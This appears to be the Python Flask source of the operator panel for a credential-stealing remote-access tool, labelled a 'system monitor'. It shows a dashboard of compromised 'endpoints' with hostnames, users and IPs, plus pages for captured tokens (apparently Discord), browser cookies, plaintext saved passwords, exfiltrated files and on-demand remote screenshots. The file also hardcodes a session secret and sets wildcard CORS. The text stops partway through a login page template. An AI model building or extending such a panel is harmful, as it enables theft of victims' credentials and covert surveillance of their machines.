#!/usr/bin/env python3
"""
LEALDADE SYSTEM MONITOR - VERSÃO CORRIGIDA PARA RAILWAY
Servidor robusto sem dependências problemáticas
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'LEALDADE_SECRET_KEY_2024_SECURE_SESSION'

# Middleware de proteção
def require_login(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            # Registrar tentativa de acesso não autorizado
            client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'unknown'))
            user_agent = request.headers.get('User-Agent', 'unknown')
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Log da tentativa (pode ser salvo em arquivo ou banco depois)
            print(f"[SECURITY] Unauthorized access attempt from {client_ip} at {timestamp}")
            print(f"[SECURITY] User-Agent: {user_agent}")
            
            # Retornar página de aviso
            return WARNING_TEMPLATE.replace('{{TIMESTAMP}}', timestamp).replace('{{CLIENT_IP}}', client_ip).replace('{{USER_AGENT}}', user_agent[:100] + '...' if len(user_agent) > 100 else user_agent)
        return f(*args, **kwargs)
    return decorated_function

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

# Template de aviso para tentativas de acesso não autorizado
WARNING_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Negado - LEALDADE SYSTEM</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000000;
            min-height: 100vh;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(127, 29, 29, 0.1), rgba(239, 68, 68, 0.05));
            z-index: 1;
        }
        
        .warning-container {
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(239, 68, 68, 0.3);
            border-radius: 20px;
            padding: 50px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 10;
            animation: warningPulse 2s infinite;
        }
        
        @keyframes warningPulse {
            0%, 100% { box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); }
            50% { box-shadow: 0 0 50px rgba(239, 68, 68, 0.4); }
        }
        
        .warning-icon {
            font-size: 4em;
            color: #ef4444;
            margin-bottom: 20px;
            animation: shake 0.5s infinite;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        .warning-title {
            font-size: 2em;
            color: #ef4444;
            margin-bottom: 15px;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
        }
        
        .warning-message {
            font-size: 1.2em;
            color: #fca5a5;
            margin-bottom: 10px;
            line-height: 1.6;
        }
        
        .warning-subtitle {
            font-size: 1em;
            color: #9ca3af;
            margin-bottom: 30px;
            font-style: italic;
        }
        
        .warning-details {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }
        
        .warning-details p {
            color: #fca5a5;
            margin-bottom: 10px;
            font-size: 0.9em;
        }
        
        .warning-details p:last-child {
            margin-bottom: 0;
        }
        
        .redirect-btn {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .redirect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(239, 68, 68, 0.3);
        }
        
        .countdown {
            color: #fca5a5;
            font-size: 1.1em;
            margin-top: 20px;
            font-weight: 600;
        }
        
        .access-log {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 10px;
            padding: 15px;
            font-size: 0.8em;
            color: #fca5a5;
            z-index: 20;
        }
    </style>
</head>
<body>
    <div class="warning-container">
        <div class="warning-icon">⚠️</div>
        <h1 class="warning-title">ACESSO NEGADO</h1>
        <p class="warning-message">Não vai ser fácil assim...</p>
        <p class="warning-subtitle">Tentativa de acesso não autorizado detectada</p>
        
        <div class="warning-details">
            <p>🔒 Esta área é protegida por autenticação</p>
            <p>🚫 Tentativa de acesso direto bloqueada</p>
            <p>📡 IP e informações registradas no sistema</p>
            <p>⏰ Timestamp: {{TIMESTAMP}}</p>
        </div>
        
        <button class="redirect-btn" onclick="redirectToLogin()">IR PARA LOGIN</button>
        <div class="countdown">Redirecionando em <span id="countdown">10</span> segundos...</div>
    </div>
    
    <div class="access-log">
        <strong>LOG DE SEGURANÇA:</strong><br>
        IP: {{CLIENT_IP}}<br>
        User-Agent: {{USER_AGENT}}<br>
        Tentativa: {{TIMESTAMP}}
    </div>
    
    <script>
        let countdown = 10;
        const countdownElement = document.getElementById('countdown');
        
        const interval = setInterval(() => {
            countdown--;
            countdownElement.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(interval);
                redirectToLogin();
            }
        }, 1000);
        
        function redirectToLogin() {
            window.location.href = '/';
        }
        
        // Prevenir voltar
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
        
        // Desabilitar atalhos
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
                e.preventDefault();
                redirectToLogin();
            }
        });
    </script>
</body>
</html>
"""

# Template HTML robusto
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE SYSTEM MONITOR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f23;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { 
            font-size: 2.5em; 
            margin-bottom: 15px; 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            letter-spacing: 2px;
        }
        .header p { color: #9ca3af; font-size: 1.1rem; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 25px; 
            margin-bottom: 50px;
        }
        .stat-card { 
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px; 
            padding: 25px; 
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
        }
        .stat-value { 
            font-size: 2.5em; 
            font-weight: 700; 
            color: #a855f7;
            margin-bottom: 5px;
        }
        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        
        .tabs-container { 
            display: flex; 
            margin-bottom: 30px;
            background: rgba(17, 17, 27, 0.6);
            border-radius: 12px;
            padding: 5px;
        }
        .tab { 
            background: transparent; 
            color: #9ca3af; 
            border: none; 
            padding: 15px 25px; 
            cursor: pointer;
            border-radius: 8px;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            flex: 1;
        }
        .tab.active { 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .cards-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
            gap: 25px; 
        }
        .card { 
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
            border: 1px solid rgba(124, 58, 237, 0.1);
            border-radius: 16px; 
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .card:hover { transform: translateY(-3px); }
        .card h3 { 
            color: #a855f7; 
            margin-bottom: 20px; 
            font-size: 1.3rem;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .card p { margin: 8px 0; color: #e0e0e0; }
        .card strong { color: #a855f7; }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 24px;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
            transition: transform 0.3s ease;
        }
        .refresh-btn:hover { transform: scale(1.1); }
        
        .data-section {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-section h3 {
            color: #a855f7;
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .token-card, .cookie-card, .password-card {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            word-break: break-all;
        }
        .screenshot-img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(124, 58, 237, 0.3);
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>LEALDADE SYSTEM MONITOR</h1>
            <p>Painel de Monitoramento em Tempo Real</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalMetrics">0</div>
                <div class="stat-label">Métricas</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>

        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
            <button class="tab" onclick="showTab('data')">Dados</button>
        </div>
        
        <div id="endpoints" class="tab-content active">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
            </div>
        </div>

        <div id="screenshot" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                    <option value="">Selecione um endpoint...</option>
                </select>
                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                    <div style="color: #6b7280;">Selecione um endpoint</div>
                </div>
            </div>
        </div>
        
        <div id="data" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
                </div>
                
                <div id="dataContent" style="min-height: 400px;">
                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
                </div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadAllData()">🔄</button>

    <script>
        let currentEndpoint = null;
        let currentCategory = null;

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function showDataCategory(category) {
            currentCategory = category;
            const contentDiv = document.getElementById('dataContent');
            
            switch(category) {
                case 'tokens':
                    loadTokens();
                    break;
                case 'cookies':
                    loadCookies();
                    break;
                case 'passwords':
                    loadPasswords();
                    break;
                case 'files':
                    loadFiles();
                    break;
            }
        }

        async function loadEndpoints() {
            try {
                const response = await fetch('/api/endpoints');
                const endpoints = await response.json();
                
                const container = document.getElementById('endpointsList');
                container.innerHTML = '';
                
                Object.values(endpoints).forEach(endpoint => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = `
                        <h3>${endpoint.hostname}</h3>
                        <p><strong>ID:</strong> ${endpoint.id}</p>
                        <p><strong>Usuário:</strong> ${endpoint.user}</p>
                        <p><strong>IP Local:</strong> ${endpoint.ip_address}</p>
                        <p><strong>IP Externo:</strong> ${endpoint.external_ip}</p>
                        <p><strong>Plataforma:</strong> ${endpoint.platform}</p>
                        <p><strong>RAM:</strong> ${endpoint.ram}</p>
                        <p><strong>Status:</strong> 🟢 Online</p>
                        <p><strong>Visto:</strong> ${endpoint.last_seen}</p>
                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('${endpoint.id}')">📸 Screenshot</button>
                    `;
                    container.appendChild(div);
                });
                
                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
                
                // Atualiza o select de endpoints
                const select = document.getElementById('endpointSelect');
                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
                Object.keys(endpoints).forEach(id => {
                    const option = document.createElement('option');
                    option.value = id;
                    option.textContent = `${endpoints[id].hostname} (${id})`;
                    select.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading endpoints:', error);
            }
        }

        async function loadTokens() {
            try {
                const response = await fetch('/api/tokens_data');
                const tokens = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
                
                const tokensList = document.getElementById('tokensList');
                tokensList.innerHTML = '';
                
                Object.entries(tokens).forEach(([endpoint_id, data]) => {
                    data.tokens.forEach(token => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Token:</strong> ${token.token || 'N/A'}<br>
                            <strong>Válido:</strong> ${token.valid ? '✅' : '❌'}<br>
                            ${token.account ? `<strong>Usuário:</strong> ${token.account.username}#${token.account.discriminator}<br>` : ''}
                        `;
                        tokensList.appendChild(div);
                    });
                });
                
                if (Object.keys(tokens).length === 0) {
                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading tokens:', error);
            }
        }

        async function loadCookies() {
            try {
                const response = await fetch('/api/cookies_data');
                const cookies = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
                
                const cookiesList = document.getElementById('cookiesList');
                cookiesList.innerHTML = '';
                
                Object.entries(cookies).forEach(([endpoint_id, data]) => {
                    data.cookies.forEach(cookie => {
                        const div = document.createElement('div');
                        div.className = 'cookie-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Host:</strong> ${cookie.host}<br>
                            <strong>Nome:</strong> ${cookie.name}<br>
                            <strong>Valor:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}<br>
                        `;
                        cookiesList.appendChild(div);
                    });
                });
                
                if (Object.keys(cookies).length === 0) {
                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading cookies:', error);
            }
        }

        async function loadPasswords() {
            try {
                const response = await fetch('/api/passwords_data');
                const passwords = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
                
                const passwordsList = document.getElementById('passwordsList');
                passwordsList.innerHTML = '';
                
                Object.entries(passwords).forEach(([endpoint_id, data]) => {
                    data.passwords.forEach(password => {
                        const div = document.createElement('div');
                        div.className = 'password-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Navegador:</strong> ${password.browser}<br>
                            <strong>URL:</strong> ${password.url}<br>
                            <strong>Usuário:</strong> ${password.username}<br>
                            <strong>Senha:</strong> ${password.password}<br>
                        `;
                        passwordsList.appendChild(div);
                    });
                });
                
                if (Object.keys(passwords).length === 0) {
                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading passwords:', error);
            }
        }

        async function loadFiles() {
            try {
                const response = await fetch('/api/files_data');
                const files = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
                
                const filesList = document.getElementById('filesList');
                filesList.innerHTML = '';
                
                Object.entries(files).forEach(([endpoint_id, data]) => {
                    data.files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = `
                            <strong>Endpoint:</strong> ${endpoint_id}<br>
                            <strong>Nome:</strong> ${file.name || file.filename}<br>
                            <strong>Tamanho:</strong> ${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
                            <strong>Tipo:</strong> ${file.type || file.content_type}<br>
                        `;
                        filesList.appendChild(div);
                    });
                });
                
                if (Object.keys(files).length === 0) {
                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }

        async function loadScreenshots() {
            try {
                const response = await fetch('/api/screenshots');
                const screenshots = await response.json();
                
                const container = document.getElementById('screenContent');
                container.innerHTML = '';
                
                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                    const div = document.createElement('div');
                    div.innerHTML = `
                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
                    `;
                    container.appendChild(div);
                });
                
                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
                
                if (Object.keys(screenshots).length === 0) {
                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading screenshots:', error);
            }
        }

        function selectEndpoint() {
            const select = document.getElementById('endpointSelect');
            currentEndpoint = select.value;
            const btn = document.getElementById('screenshotBtn');
            
            if (currentEndpoint) {
                btn.disabled = false;
                btn.style.opacity = '1';
            } else {
                btn.disabled = true;
                btn.style.opacity = '0.5';
            }
        }

        async function requestScreenshot(endpointId) {
            const id = endpointId || currentEndpoint;
            if (!id) {
                alert('Selecione um endpoint primeiro');
                return;
            }
            
            try {
                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(`Screenshot solicitado para ${id}!`);
                    setTimeout(() => {
                        loadScreenshots();
                        if (currentEndpoint === id) {
                            selectEndpoint();
                        }
                    }, 5000);
                } else {
                    alert(`Erro: ${result.message}`);
                }
            } catch (error) {
                console.error('Error requesting screenshot:', error);
            }
        }

        function loadAllData() {
            loadEndpoints();
            
            fetch('/api/metrics_data')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalMetrics').textContent = data.length;
                })
                .catch(error => console.error('Error loading metrics:', error));
        }

        // Carrega dados iniciais
        loadAllData();
        
        // Atualiza a cada 30 segundos
        setInterval(loadAllData, 30000);
    </script>
</body>
</html>
"""

# Template do login roxo/preto premium com animações cinematográficas
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE - Portal Exclusivo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000000;
            min-height: 100vh;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Prevenir seleção em todos os elementos */
        * {
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Permitir seleção apenas em inputs */
        input, input * {
            user-select: text !important;
            -webkit-user-select: text !important;
            -moz-user-select: text !important;
            -ms-user-select: text !important;
        }
        
        /* Gradiente de fundo preto limpo */
        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            opacity: 1;
            z-index: 0;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
        
        /* Partículas mínimas e escuras */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            animation: float 40s infinite linear;
        }
        
        .particle.small {
            width: 1px;
            height: 1px;
            background: rgba(76, 29, 149, 0.3);
            box-shadow: 0 0 3px rgba(76, 29, 149, 0.2);
        }
        
        .particle.medium {
            width: 2px;
            height: 2px;
            background: rgba(76, 29, 149, 0.2);
            box-shadow: 0 0 4px rgba(76, 29, 149, 0.1);
        }
        
        .particle.large {
            width: 3px;
            height: 3px;
            background: rgba(76, 29, 149, 0.15);
            box-shadow: 0 0 5px rgba(76, 29, 149, 0.1);
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg) scale(0); opacity: 0; }
            10% { opacity: 0.3; transform: scale(1); }
            90% { opacity: 0.3; }
            100% { transform: translateY(-100vh) rotate(720deg) scale(0); opacity: 0; }
        }
        
        /* Remover grid hexagonal */
        .hex-grid {
            display: none;
        }
        
        /* Container principal clean */
        .login-container {
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 50px;
            max-width: 450px;
            width: 100%;
            border: 1px solid rgba(76, 29, 149, 0.2);
            box-shadow: 
                0 10px 30px rgba(0, 0, 0, 0.8),
                0 0 20px rgba(76, 29, 149, 0.1);
            position: relative;
            z-index: 10;
            animation: containerEntrance 0.8s ease-out;
        }
        
        @keyframes containerEntrance {
            from { 
                opacity: 0; 
                transform: translateY(30px) scale(0.95); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1); 
            }
        }
        
        /* Borda sutil */
        .login-container::before {
            content: '';
            position: absolute;
            top: -1px;
            left: -1px;
            right: -1px;
            bottom: -1px;
            background: linear-gradient(
                45deg, 
                rgba(76, 29, 149, 0.3), 
                rgba(76, 29, 149, 0.1), 
                rgba(76, 29, 149, 0.3)
            );
            border-radius: 20px;
            z-index: -1;
            opacity: 0.5;
        }
        
        /* Logo clean */
        .logo {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .logo h1 {
            font-size: 3.5em;
            font-weight: 800;
            color: #4c1d95;
            letter-spacing: 3px;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(76, 29, 149, 0.3);
        }
        
        .logo p {
            color: #6b21a8;
            font-size: 1em;
            font-weight: 400;
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.8;
        }
        
        /* Remover partículas do logo */
        .logo-particles {
            display: none;
        }
        
        /* Formulário clean */
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #6b21a8;
            font-weight: 500;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 18px 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(76, 29, 149, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 1em;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4c1d95;
            background: rgba(0, 0, 0, 0.9);
            box-shadow: 0 0 15px rgba(76, 29, 149, 0.2);
        }
        
        .form-group input::placeholder {
            color: #6b7280;
        }
        
        /* Remover efeitos extras */
        .ripple {
            display: none;
        }
        
        .input-glow {
            display: none;
        }
        
        /* Botão clean */
        .login-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(
                135deg, 
                #4c1d95 0%, 
                #6b21a8 50%, 
                #7c3aed 100%
            );
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-top: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(76, 29, 149, 0.2);
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(76, 29, 149, 0.3);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .login-btn.loading {
            animation: btnPulse 1.5s infinite;
            pointer-events: none;
        }
        
        @keyframes btnPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        /* Mensagens clean */
        .message {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            border-left: 3px solid #4c1d95;
        }
        
        .message p {
            color: #9ca3af;
            font-style: italic;
            line-height: 1.6;
            font-size: 0.9em;
        }
        
        .error, .success {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
            display: none;
        }
        
        .error {
            background: rgba(127, 29, 29, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
        }
        
        .success {
            background: rgba(20, 83, 45, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            color: #86efac;
        }
        
        /* Remover indicadores de digitação */
        .typing-indicator {
            display: none;
        }
        
        /* Responsive design */
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 25px;
                margin: 20px;
            }
            
            .logo h1 {
                font-size: 2.8em;
            }
            
            .form-group input {
                padding: 16px 18px;
            }
            
            .login-btn {
                padding: 18px;
                font-size: 1em;
            }
        }
        
        /* Remover animações complexas */
        .success-animation {
            display: none;
        }
        
        .success-circle {
            display: none;
        }
        
        .success-checkmark {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Fundos animados -->
    <div class="gradient-bg"></div>
    <div class="hex-grid"></div>
    <div class="particles" id="particles"></div>
    
    <!-- Container principal -->
    <div class="login-container">
        <div class="logo">
            <div class="logo-particles" id="logoParticles"></div>
            <h1>LEALDADE</h1>
            <p>Portal Exclusivo</p>
        </div>
